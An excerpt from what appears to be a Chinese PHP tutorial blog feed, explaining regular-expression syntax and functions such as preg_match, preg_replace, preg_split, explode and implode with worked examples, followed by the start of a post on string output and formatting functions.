<li><p><code>.</code>：匹配除换行符外任何一个字符</p>
<blockquote>
<p>通常可以使用“.*”组合来匹配除换行符外的任何字符。</p>
</blockquote>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/^a.*z$/&#x27;</span>;		//匹配字母a开头,z结尾的任意不包含换行符的字符串</span><br><span class="line"><span class="variable">$check</span> = <span class="string">&#x27;/^a.+z$/&#x27;</span>;		//匹配字母a开头,z结尾的三个字符串,不匹配<span class="string">&quot;az&quot;</span></span><br><span class="line">preg_match(<span class="variable">$check</span>, <span class="string">&#x27;aasdasdsaz&#x27;</span>,<span class="variable">$info</span>);</span><br><span class="line">var_dump(<span class="variable">$info</span>);</span><br></pre></td></tr></table></figure>
<h4 id="方括号表达式"><a href="#方括号表达式" class="headerlink" title="方括号表达式"></a>方括号表达式</h4><ul>
<li><code>[]</code>：存放一组原子，彼此地位平等，仅匹配其中的一个原子。例如想匹配一个<code>a</code>或<code>e</code>，使用<code>[ae]</code>。<ul>
<li>例如:<code>Pr[ae]y</code> 匹配 <code>Pray</code>或者 <code>Prey</code>。</li>
</ul>
</li>
<li><code>[^]</code>：排除原子表，匹配除表内原子外的任意一个字符。<ul>
<li>例如：<code>/p[^u]/</code>匹配<code>part</code>中的<code>pa</code>，但无法匹配<code>computer</code>中的<code>pu</code>因为<code>u</code>在匹配中被排除。</li>
</ul>
</li>
<li><code>[-]</code>：用于连接一组按<code>ASCII</code>码顺序排序的原子，简化书写。<ul>
<li>例如：<code>/x[0123456789]/</code>可以写成<code>x[0-9]</code>,用来匹配一个由 <code>x</code> 字母与一个数字组成的字符串。<blockquote>
<p>其他常用的匹配：<br>/[a-zA-Z]/匹配所有大小写字母<br>/^[a-z][0-9]$/匹配比如“z2”、 “t6” 、“g7”<br>/0[xX][0-9a-fA-F]/匹配一个简单的十六进制数字，如“0x9”。<br>/[^0-9a-zA-Z_]/匹配除英文字母、数字和下划线以外任何一个字符，其等价于\W。  <br>/0?[ xX][0-9a-fA-F]+/匹配十六进制数字，可以匹配“0x9B3C”或者“X800”等。<br>/&lt;[A-Za-z][A-Za-z0-9]*&gt;/可以匹配“<P>”、“<hl>”或“<Body>”等HTML标签，并且不严格的控制大小写。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="模式选择符"><a href="#模式选择符" class="headerlink" title="模式选择符"></a>模式选择符</h4><ul>
<li><p><code>|</code>：在正则表达式中匹配两个或更多的选择之一</p>
<ul>
<li>例如：在字符串<code>There are many apples and pears</code>中， <code>/apple|pear/</code>在第一次运行时匹配<code>apple</code>，再次运行时匹配<code>pear</code>。也可以继续增加选项，如：<code>/apple|pear|banana|lemon/</code><h4 id="模式单元符"><a href="#模式单元符" class="headerlink" title="模式单元符"></a>模式单元符</h4></li>
</ul>
</li>
<li><p><code>()</code>：将其中的正则表达式变为原子（或称模式单元）使用，与数学表达式中的括号类似。</p>
<ul>
<li>例1：<code>/(Dog)+/</code>匹配的<code>Dog</code>、<code>DogDog</code>、<code>DogDogDog</code>,因为紧接着<code>+</code>前的原子是元字符<code>()</code>括起来的字符串<code>Dog</code>。</li>
<li>例2：<code>/Hello (world|earth)/</code>匹配<code>Hello world</code>、<code>Hello earth</code>。<blockquote>
<p>一个模式单元中的表达式将被优先匹配或运算。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h5 id="重新使用的模式单元"><a href="#重新使用的模式单元" class="headerlink" title="重新使用的模式单元"></a>重新使用的模式单元</h5><p>系统自动将模式单元<code>()</code>中的匹配依次存储起来，在需要时可以用<code>\1</code>、<code>\2</code>、<code>\3</code>的形式进行引用。当正则表达式包含有相同的模式单元时，这种方法非常便于对其进行管理。注意使用时需要写成<code>\\1</code>、<code>\\2</code></p>
<ul>
<li>例如：<code>/^\d&#123;2&#125;([\W])\d&#123;2&#125;\\1\d&#123;4&#125;$/</code>匹配<code>12-31-2006</code>、<code>09/27/1996</code>、<code>86 01 4321</code>等字符串。但上述正则表达式不匹配<code>12/34-5678</code>的格式。这是因为模式<code>[\W]</code>的结果<code>/</code>已经被存储。下个位置<code>\1</code>引用时，其匹配模式也是字符<code>/</code>。</li>
</ul>
<p>当不需要存储匹配结果时使用非存储模式单元<code>(?:)</code></p>
<ul>
<li>例如：<code>/(?:a|b|c)(D|E|F)\\1g/</code> 将匹配<code>aEEg</code>。在一些正则表达式中，使用非存储模式单元是必要的。否则，需要改变其后引用的顺序。上例还可以写成<code>/(a|b|c)(C|E|F)\\2g/</code>。<h4 id="模式匹配的优先级"><a href="#模式匹配的优先级" class="headerlink" title="模式匹配的优先级"></a>模式匹配的优先级</h4></li>
</ul>
<table>
<thead>
<tr>
<th><strong>顺序</strong></th>
<th><strong>元字符</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>1</strong></td>
<td><strong>\</strong></td>
<td>转义字符</td>
</tr>
<tr>
<td><strong>2</strong></td>
<td><strong>()  (?:)  (?=)    []</strong></td>
<td>模式单元和原子表</td>
</tr>
<tr>
<td><strong>3</strong></td>
<td>***  +   ?    {n}  {n,} {n,m}**</td>
<td>重复匹配</td>
</tr>
<tr>
<td><strong>4</strong></td>
<td><strong>^  $  \b    \B  \A   \Z</strong></td>
<td>边界限制</td>
</tr>
<tr>
<td><strong>5</strong></td>
<td>**</td>
<td>**</td>
</tr>
</tbody></table>
<h3 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h3><table>
<thead>
<tr>
<th><strong>修正符</strong></th>
<th><strong>含义描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>i</strong></td>
<td>在和模式进行匹配时不区分大小写</td>
</tr>
<tr>
<td><strong>m</strong></td>
<td>将字符串视为多行。默认的正则开始“^”和结束“$”将目标字符串作为单一的一“行”字符。加上m后，那么开始和结束将会指字符串的每一行。</td>
</tr>
<tr>
<td><strong>s</strong></td>
<td>如果设定了此修正符，模式中的圆点元字符“.”匹配所有的字符，包括换行符。即将字符串视为单行，换行符作为普通字符看待</td>
</tr>
<tr>
<td><strong>x</strong></td>
<td>模式中的空白忽略不计，除非它已经被转义</td>
</tr>
<tr>
<td><strong>e</strong></td>
<td>只用在preg_replace()函数中，在替换字符串中对逆向引用做正常的替换，将其作为  PHP 代码求值，并用其结果来替换所搜索的字符串。</td>
</tr>
<tr>
<td><strong>U</strong></td>
<td>本修正符反转了匹配数量的值使其不是默认的重复，而变成在后面跟上“?”才变得重复。这和  Perl 不兼容。也可以通过在模式之中设定  (U) 修正符或者在数量符之后跟一个问号（如启.*?）来用此选项。</td>
</tr>
<tr>
<td><strong>D</strong></td>
<td>模式中的美元元字符仅匹配目标字符串的结尾。没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前。如果设定了  m 修正符则忽略此选项</td>
</tr>
</tbody></table>
<h2 id="与Perl兼容的正则表达式函数"><a href="#与Perl兼容的正则表达式函数" class="headerlink" title="与Perl兼容的正则表达式函数"></a>与Perl兼容的正则表达式函数</h2><h3 id="字符串的匹配和查找函数"><a href="#字符串的匹配和查找函数" class="headerlink" title="字符串的匹配和查找函数"></a>字符串的匹配和查找函数</h3><ul>
<li><p><code>preg_match()</code>：执行一个正则表达式匹配</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 一个用于匹配URL的正则表达式</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(https?|ftps?):\/\/(www)\.([^\.\/]+)\.(com|net|org)(\/[\w-\.\/\?\%\&amp;\=]*)?/i&#x27;</span>; </span><br><span class="line">//被搜索字符串</span><br><span class="line"><span class="variable">$subject</span> = <span class="string">&quot;网址为http://www.lampbrother.net/index.php的位置是LAMP兄弟连&quot;</span>;    </span><br><span class="line">//使用preg_match()函数进行匹配</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$pattern</span>, <span class="variable">$subject</span>, <span class="variable">$matches</span>)) &#123;          </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;搜索到的URL为：&quot;</span>.<span class="variable">$matches</span>[0].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第一个元素保存全部匹配结果</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL中的协议为：&quot;</span>.<span class="variable">$matches</span>[1].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第二个元素保存第一个子表达式</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL中的主机为：&quot;</span>.<span class="variable">$matches</span>[2].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第三个元素保存第二个子表达式</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL中的域名为：&quot;</span>.<span class="variable">$matches</span>[3].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第四个元素保存第三个子表达式</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL中的顶域为：&quot;</span>.<span class="variable">$matches</span>[4].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第五个元素保存第四个子表达式</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL中的文件为：&quot;</span>.<span class="variable">$matches</span>[5].<span class="string">&quot;&lt;br&gt;&quot;</span>;    //数组中第六个元素保存第五个子表达式</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;搜索失败！&quot;</span>;                             //如果和正则表达式没有匹配成功则输出</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111201.png" alt="image"></p>
</li>
<li><p><code>preg_match_all()</code>：执行全局正则表达式匹配</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//声明一个可以匹配URL的正则表达式</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(https?|ftps?):\/\/(www|bbs)\.([^\.\/]+)\.(com|net|org)(\/[\w-\.\/\?\%\&amp;\=]*)?/i&#x27;</span>;  </span><br><span class="line">// //声明一个包含多个URL链接地址的多行文字</span><br><span class="line"><span class="variable">$subject</span> = <span class="string">&quot;网址为http://bbs.lampbrother.net/index.php的位置是LAMP兄弟连，</span></span><br><span class="line"><span class="string">        网址为http://www.baidu.com/index.php的位置是百度，</span></span><br><span class="line"><span class="string">        网址为http://www.google.com/index.php的位置是谷歌。&quot;</span>;</span><br><span class="line"><span class="variable">$i</span> = 1;    //定义一个计数器，用来统计搜索到的结果数</span><br><span class="line">// //搜索全部的结果</span><br><span class="line"><span class="keyword">if</span>(preg_match_all(<span class="variable">$pattern</span>, <span class="variable">$subject</span>, <span class="variable">$matches</span>, PREG_SET_ORDER)) &#123;  </span><br><span class="line">	foreach(<span class="variable">$matches</span> as <span class="variable">$urls</span>) &#123;     //循环遍历二维数组<span class="variable">$matches</span></span><br><span class="line">	    <span class="built_in">echo</span> <span class="string">&quot;搜索到第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL为：&quot;</span>.<span class="variable">$urls</span>[0].<span class="string">&quot;&lt;br&gt;&quot;</span>;   </span><br><span class="line">	    <span class="built_in">echo</span> <span class="string">&quot;第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL中的协议为：&quot;</span>.<span class="variable">$urls</span>[1].<span class="string">&quot;&lt;br&gt;&quot;</span>;   </span><br><span class="line">	    <span class="built_in">echo</span> <span class="string">&quot;第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL中的主机为：&quot;</span>.<span class="variable">$urls</span>[2].<span class="string">&quot;&lt;br&gt;&quot;</span>;   </span><br><span class="line">	    <span class="built_in">echo</span> <span class="string">&quot;第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL中的域名为：&quot;</span>.<span class="variable">$urls</span>[3].<span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line">	    <span class="built_in">echo</span> <span class="string">&quot;第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL中的顶域为：&quot;</span>.<span class="variable">$urls</span>[4].<span class="string">&quot;&lt;br&gt;&quot;</span>;   </span><br><span class="line">	    <span class="built_in">echo</span> <span class="string">&quot;第&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;个URL中的文件为：&quot;</span>.<span class="variable">$urls</span>[5].<span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line">	    <span class="variable">$i</span>++;  //计数器累加</span><br><span class="line">	&#125;   </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;搜索失败！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111202.png" alt="tp2020111202.png"></p>
</li>
<li><p><code>preg_grep()</code>：返回匹配模式的数组条目</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$array</span> = array(<span class="string">&quot;Linux RedHat9.0&quot;</span>, <span class="string">&quot;Apache2.2.9&quot;</span>, <span class="string">&quot;MySQL5.0.51&quot;</span>, <span class="string">&quot;PHP5.2.6&quot;</span>, <span class="string">&quot;LAMP&quot;</span>, <span class="string">&quot;100&quot;</span>);</span><br><span class="line">//返回数组中以字母开始和以数字结束，并且没有空格的单元，赋给变量<span class="variable">$version</span></span><br><span class="line"><span class="variable">$version</span> = preg_grep(<span class="string">&quot;/^[a-zA-Z]+(\d|\.)+$/&quot;</span>, <span class="variable">$array</span>);  </span><br><span class="line">print_r(<span class="variable">$version</span>);      </span><br><span class="line">//输出：Array ( [1] =&gt; Apache2.2.9 [2] =&gt; MySQL5.0.51 [3] =&gt; PHP5.2.6 )</span><br></pre></td></tr></table></figure>
</li>
<li><p>其它字符串处理函数：<code>strstr()</code>、<code>strpos()</code>、<code>strrpos()</code>、<code>substr()</code>字符串的替换函数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> strstr(<span class="string">&quot;this is a test!&quot;</span>, <span class="string">&quot;test&quot;</span>);     //输出<span class="built_in">test</span>!</span><br><span class="line"><span class="built_in">echo</span> strstr(<span class="string">&quot;this is a test!&quot;</span>, 115);        //搜索 <span class="string">&quot;s&quot;</span> 的ASCII值所代表的字符输出s is a <span class="built_in">test</span>!</span><br></pre></td></tr></table></figure>
<h3 id="字符串替换函数"><a href="#字符串替换函数" class="headerlink" title="字符串替换函数"></a>字符串替换函数</h3><h4 id="preg-replace：执行一个正则表达式的搜索和替换"><a href="#preg-replace：执行一个正则表达式的搜索和替换" class="headerlink" title="preg_replace：执行一个正则表达式的搜索和替换"></a>preg_replace：执行一个正则表达式的搜索和替换</h4></li>
<li><p>示例1：替换HTML标记</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//可以匹配所有HTML标记的开始和结束的正则表达式</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/&lt;[\/\!]*?[^&lt;&gt;]*?&gt;/is&quot;</span>;             </span><br><span class="line"></span><br><span class="line">//声明一个带有多个HTML标记的文本</span><br><span class="line"><span class="variable">$text</span> = <span class="string">&quot;这个文本中有&lt;b&gt;粗体&lt;/b&gt;和&lt;u&gt;带有下画线&lt;/u&gt;以及&lt;i&gt;斜体&lt;/i&gt;</span></span><br><span class="line"><span class="string">         还有&lt;font color=&#x27;red&#x27; size=&#x27;7&#x27;&gt;带有颜色和字体大小&lt;/font&gt;的标记&quot;</span>;        </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$text</span>; </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">//将所有HTML标记替换为空，即删除所有HTML标记</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$text</span>);     </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">//通过第四个参数传入数字2，替换前两个HTML标记</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$text</span>, 2);  </span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111203.png" alt="tp2020111203.png"></p>
</li>
<li><p>示例2：替换日期格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/(\d&#123;2&#125;)\/(\d&#123;2&#125;)\/(\d&#123;4&#125;)/&quot;</span>; //日期格式的正则表达式</span><br><span class="line"><span class="variable">$text</span>=<span class="string">&quot;今年国庆节放假日期为10/01/2012到10/07/2012共7天。&quot;</span>; //带有两个日期格式的字串</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="string">&quot;\\3-\\1-\\2&quot;</span>, <span class="variable">$text</span>); //将日期替换为以“-”分隔的格式</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="string">&quot;\$&#123;3&#125;-\$&#123;1&#125;-\$&#123;2&#125;&quot;</span>,<span class="variable">$text</span>); //将“\\1”改为“\<span class="variable">$&#123;1&#125;</span>”的形式</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111204.png" alt="tp2020111204.png"></p>
<h4 id="str-replace-：-子字符串替换"><a href="#str-replace-：-子字符串替换" class="headerlink" title="str_replace ： 子字符串替换"></a>str_replace ： 子字符串替换</h4><p>该函数返回一个字符串或者数组。通过<code>$count</code>参数指定来获取替换的次数。</p>
</li>
<li><p>示例1：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//声明包含多个“LAMP”字符串的文本，也包含小写的“lamp”字符串</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;LAMP是目前最流行的WEB开发平台；&lt;br&gt;LAMP为B/S架构软件开发的黄金组合；&lt;br&gt;LAMP每个成员都是开源软件；&lt;br&gt;lampBrother是LAMP的技术社区。&lt;br&gt;&quot;</span>;</span><br><span class="line">//区分大小写的将“LAMP”替换为“Linux+Apache+MySQL+PHP”，并统计替换次数</span><br><span class="line"><span class="built_in">echo</span> str_replace(<span class="string">&quot;LAMP&quot;</span>, <span class="string">&quot;Linux+Apache+MySQL+PHP&quot;</span>,<span class="variable">$str</span>, <span class="variable">$count</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;区分大小写时共替换&quot;</span>.<span class="variable">$count</span>.<span class="string">&quot;次&lt;br&gt;&quot;</span>;    //替换4次</span><br><span class="line">//不区分大小写的将“LAMP”替换为“Linux+Apache+MySQL+PHP”，并统计替换次数</span><br><span class="line"><span class="built_in">echo</span> str_ireplace(<span class="string">&quot;LAMP&quot;</span>, <span class="string">&quot;Linux+Apache+MySQL+PHP&quot;</span>, <span class="variable">$str</span>,<span class="variable">$count</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;不区分大小写时共替换&quot;</span>.<span class="variable">$count</span>.<span class="string">&quot;次&lt;br&gt;&quot;</span>;    //替换5次</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111205.png" alt="tp2020111205.png"></p>
</li>
<li><p>示例2：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//元音字符数组</span><br><span class="line"><span class="variable">$vowels</span> = array(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;U&quot;</span>);  </span><br><span class="line">//将第三个参数中的字符串，搜索到的数组中的元素值都被替换为空，区分大写小替换</span><br><span class="line"><span class="built_in">echo</span> str_replace(<span class="variable">$vowels</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Hello World of PHP&quot;</span>);  //输出: Hll Wrld f PHP</span><br><span class="line">//元音字符数组</span><br><span class="line"><span class="variable">$vowels</span> = array(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;u&quot;</span>);                           </span><br><span class="line">//将第三个参数中的字符串，搜索到的数组中的元素值都被替换为空，不区分大写小替换</span><br><span class="line"><span class="built_in">echo</span> str_ireplace(<span class="variable">$vowels</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;HELLO WORLD OF PHP&quot;</span>); //输出：HLL WRLD F PHP</span><br></pre></td></tr></table></figure>
<h3 id="字符串的分割与连接"><a href="#字符串的分割与连接" class="headerlink" title="字符串的分割与连接"></a>字符串的分割与连接</h3><h4 id="preg-split：通过一个正则表达式分隔字符串"><a href="#preg-split：通过一个正则表达式分隔字符串" class="headerlink" title="preg_split：通过一个正则表达式分隔字符串"></a>preg_split：通过一个正则表达式分隔字符串</h4></li>
<li><p><code>PREG_SPLIT_NO_EMPTY</code>：返回分隔后的非空部分</p>
</li>
<li><p><code>PREG_SPLIT_DELIM_CAPTURE</code>：用于分隔的模式中的括号表达式将被捕获并返回. </p>
</li>
<li><p><code>PREG_SPLIT_OFFSET_CAPTURE</code>：返回附加字符串偏移量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//按任意数量的空格和逗号分隔字符串，其中包含<span class="string">&quot; &quot;</span>, \r, \t, \n and \f</span><br><span class="line"><span class="variable">$keywords</span> = preg_split (<span class="string">&quot;/[\s,]+/&quot;</span>, <span class="string">&quot;hypertext language, programming&quot;</span>);</span><br><span class="line">print_r(<span class="variable">$keywords</span>);     </span><br><span class="line">//分割后输出Array ( [0] =&gt; hypertext [1] =&gt; language [2] =&gt; programming ) </span><br><span class="line"></span><br><span class="line">//将字符串分割成字符</span><br><span class="line"><span class="variable">$chars</span> = preg_split(<span class="string">&#x27;//&#x27;</span>, <span class="string">&quot;lamp&quot;</span>, -1, PREG_SPLIT_NO_EMPTY);</span><br><span class="line">print_r(<span class="variable">$chars</span>);        //分割后输出Array ( [0] =&gt; l [1] =&gt; a [2] =&gt; m [3] =&gt; p ) </span><br><span class="line"></span><br><span class="line">//将字符串分割为匹配项及其偏移量</span><br><span class="line"><span class="variable">$chars</span> = preg_split(<span class="string">&#x27;/ /&#x27;</span>,<span class="string">&#x27;hypertext language programming&#x27;</span>, -1, </span><br><span class="line">			PREG_SPLIT_OFFSET_CAPTURE);</span><br><span class="line">print_r(<span class="variable">$chars</span>);    </span><br><span class="line"></span><br><span class="line">/* 分割后输出:</span><br><span class="line">    Array ( [0] =&gt; Array ( [0] =&gt; hypertext [1] =&gt; 0 ) </span><br><span class="line">               [1] =&gt; Array ( [0] =&gt; language [1] =&gt; 10 ) </span><br><span class="line">               [2] =&gt; Array ( [0] =&gt; programming [1] =&gt; 19 ) )     */</span><br></pre></td></tr></table></figure>
<h4 id="explode：使用一个字符串分割另一个字符串"><a href="#explode：使用一个字符串分割另一个字符串" class="headerlink" title="explode：使用一个字符串分割另一个字符串"></a>explode：使用一个字符串分割另一个字符串</h4><p><code>array explode(string $separator,string $string[,int $limit])</code><br>此函数返回由字符串组成的数组，每个元素都是 <code>string</code>的一个子串，它们被字符串 <code>separator</code>作为边界点分割出来。 其中<code>$limit</code>是指定对大分割个数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$lamp</span> = <span class="string">&quot;Linux Apache MySQL PHP&quot;</span>;   //声明一个字符串<span class="variable">$lamp</span>，每个单词之间使用空格分割</span><br><span class="line"><span class="variable">$lampbrother</span> = explode(<span class="string">&quot; &quot;</span>, <span class="variable">$lamp</span>); //将字符串<span class="variable">$lamp</span>使用空格分割，并组成数组返回</span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;redhat:*:500:508::/home/redhat:/bin/bash&quot;</span>; //将Linux中的用户文件的一行提出</span><br><span class="line">//按“：”分割7个子串,并存放对对应的变量中.</span><br><span class="line">list(<span class="variable">$user</span>, <span class="variable">$pass</span>, <span class="variable">$uid</span>, <span class="variable">$gid</span>, , <span class="variable">$home</span>, <span class="variable">$shell</span>) = explode(<span class="string">&quot;:&quot;</span>, <span class="variable">$password</span>);  </span><br><span class="line"></span><br><span class="line">//声明字符串<span class="variable">$lamp</span>，每个单词之间使用加号“+”分割</span><br><span class="line"><span class="variable">$lamp</span> = <span class="string">&quot;Linux+Apache+MySQL+PHP&quot;</span>;  </span><br><span class="line">//使用正数限制子串个数，而最后那个元素将包含 <span class="variable">$lamp</span>中 的剩余部分</span><br><span class="line">print_r(explode(<span class="string">&#x27;+&#x27;</span>, <span class="variable">$lamp</span>, 2));  //输出Array ( [0] =&gt; Linux [1] =&gt; Apache+MySQL+PHP )</span><br><span class="line">//使用负数限制子串，则返回除了最后的限制个元素外的所有元素</span><br><span class="line">print_r(explode(<span class="string">&#x27;+&#x27;</span>, <span class="variable">$lamp</span>, -1));  //输出Array ( [0] =&gt; Linux [1] =&gt; Apache [2] =&gt; MySQL )</span><br></pre></td></tr></table></figure>
<h4 id="implode：使用一个子串组装一个数组。"><a href="#implode：使用一个子串组装一个数组。" class="headerlink" title="implode：使用一个子串组装一个数组。"></a>implode：使用一个子串组装一个数组。</h4><p><code>string implode(string $glue,array $pieces)</code><br>将<code>pieces</code>数组中的每个值，使用<code>glue</code>作为分隔符组装成一个子串并返回。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$lamp</span> = array(<span class="string">&quot;Linux&quot;</span>, <span class="string">&quot;Apache&quot;</span>, <span class="string">&quot;MySQL&quot;</span>, <span class="string">&quot;PHP&quot;</span>);</span><br><span class="line"><span class="built_in">echo</span> implode(<span class="string">&quot;+&quot;</span>, <span class="variable">$lamp</span>);      //使用加号连接后输出Linux+Apache+MySQL+PHP</span><br><span class="line"><span class="built_in">echo</span> join(<span class="string">&quot;+++&quot;</span>, <span class="variable">$lamp</span>);        //使用三个加号连接后输出Linux+++Apache+++MySQL+++PHP</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP基础</tag>
      </tags>
  </entry>
  <entry>
    <title>字符串介绍，常用字符串输出函数、格式化函数、比较函数</title>
    <url>/posts/e0d73a1e.html</url>
    <content><![CDATA[<h2 id="什么是字符串"><a href="#什么是字符串" class="headerlink" title="什么是字符串"></a>什么是字符串</h2><blockquote>
<p>在C语言中字符串是作为字节数组处理的。在Java语言中字符串是作为对象处理的。而php则把字符串作为基本数据类型来处理。通常对字符串的处理涉及字符串的格式化。字符串的分割和连接、字符串的比较、以及字符串的查找、匹配和替换。</p>
</blockquote>
<h2 id="常用的字符串输出函数"><a href="#常用的字符串输出函数" class="headerlink" title="常用的字符串输出函数"></a>常用的字符串输出函数</h2><h3 id="常规输出字符串"><a href="#常规输出字符串" class="headerlink" title="常规输出字符串"></a>常规输出字符串</h3><ul>
<li><code>echo()</code>：输出字符串</li>
<li><code>print()</code>：输出一个字符串<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$array &#x3D; [1,2,3];</span><br><span class="line">$string &#x3D; &quot;123&quot;;</span><br><span class="line">&#x2F;&#x2F;echo $array;</span><br><span class="line">echo $string;</span><br><span class="line">&#x2F;&#x2F;print($array);</span><br><span class="line">print($string);</span><br></pre></td></tr></table></figure>
<code>echo()</code>和<code>print()</code>都只能输出字符串，而不能输出数组<h3 id="输出字符串并退出程序"><a href="#输出字符串并退出程序" class="headerlink" title="输出字符串并退出程序"></a>输出字符串并退出程序</h3><code>die()和exit()</code>：输出一个字符串后退出程序<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$string &#x3D; &quot;123&quot;;</span><br><span class="line">&#x2F;&#x2F;die($string);</span><br><span class="line">exit($string);</span><br><span class="line">echo &quot;我不会运行&quot;;</span><br></pre></td></tr></table></figure>
<code>die()</code>和<code>exit()</code>同样都只能输出字符串，而不能输出数组<h3 id="格式化输出字符串"><a href="#格式化输出字符串" class="headerlink" title="格式化输出字符串"></a>格式化输出字符串</h3>字符串转换格式：</li>
</ul>
<table>
<thead>
<tr>
<th>格式</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>%%</td>
<td>返回百分比符号</td>
</tr>
<tr>
<td>%b</td>
<td>二进制数</td>
</tr>
<tr>
<td>%c</td>
<td>依照ASCII值的字符</td>
</tr>
<tr>
<td>%d</td>
<td>带符号十进制数</td>
</tr>
<tr>
<td>%e</td>
<td>可续计数法（如1.5e3）</td>
</tr>
<tr>
<td>%u</td>
<td>无符号十进制数</td>
</tr>
<tr>
<td>%f或%F</td>
<td>浮点数</td>
</tr>
<tr>
<td>%o</td>
<td>八进制数</td>
</tr>
<tr>
<td>%s</td>
<td>字符串</td>
</tr>
<tr>
<td>%x或%X</td>
<td>十六进制数</td>
</tr>
</tbody></table>
<ul>
<li><code>printf()</code>：输出格式化字符串</li>
<li><code>sprintf()</code>：把格式化的字符串写入一个变量中</li>
</ul>
<p><code>printf()</code>和<code>sprintf()</code>都是格式化输出字符串，区别在于<code>sprintf()</code>可以把格式化的字符串写入到一个变量中</p>
